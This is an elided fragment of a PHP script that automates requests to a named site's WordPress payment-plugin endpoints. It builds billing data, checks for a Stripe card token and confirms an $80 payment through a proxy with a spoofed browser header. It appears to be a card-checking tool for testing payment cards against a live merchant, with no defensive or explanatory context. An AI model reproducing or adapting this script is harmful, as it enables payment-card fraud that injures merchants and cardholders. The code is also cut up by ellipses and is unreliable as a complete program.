...
// 	# code...
   	$page =  cURL(
        "https://eyeharp.org/?asp_action=show_pp&product_id=5170",
        $headers = [
     ...
     $ajax_create_pi =  cURL(
        "https://eyeharp.org/wp-admin/admin-ajax.php",
        $headers = [
            "accept: */*",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://eyeharp.org/?asp_action=show_pp&product_id=5170",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
        ],
        'action=asp_pp_create_pi&nonce='.$create_pi.'&amount=80&curr=USD&product_id=5170&quantity=1&billing_details={"name":"'.$fname.' '.$lname.'","email":"'.$email.'","address":{"line1":"'.$street.'","city":"'.$city.'","state":"'.$state.'","country":"US","postal_code":"'.$postcode.'"}}&token=15bb4f03fdbb1ac1b413b4d64ff38c5d',
        "POST",
        1,
        $cookie
...
if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {
     ...
     $ajax_confirm =  cURL_ProxyOn(  
        ...
        'action=asp_pp_confirm_pi&nonce='.$confirm.'&product_id=5170&pi_id='.$pi_id.'&token=15bb4f03fdbb1ac1b413b4d64ff38c5d&opts={"payment_method_data":{"type":"card","card":{"token":"'.$token.'"},"billing_details":{"name":"'.$fname.' '.$lname.'","email":"'.$email.'"}}}',
        "POST",
        1,
        $cookie
    ); 
